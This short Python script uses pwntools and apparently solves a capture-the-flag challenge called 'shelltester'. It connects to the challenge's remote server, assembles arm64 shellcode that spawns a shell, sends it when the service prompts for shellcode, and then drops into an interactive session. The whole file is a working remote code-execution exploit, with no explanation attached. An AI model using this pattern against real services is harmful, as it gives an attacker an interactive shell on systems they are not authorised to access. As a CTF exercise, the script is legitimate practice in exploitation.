from pwn import *

context(arch="arm64")

r = remote("shelltester.challs.csc.tf", 1337)

shellcode = asm(shellcraft.sh())

r.sendlineafter(b"Just give me a shellcode and I will run it in a safe place!\n", shellcode)

r.interactive()
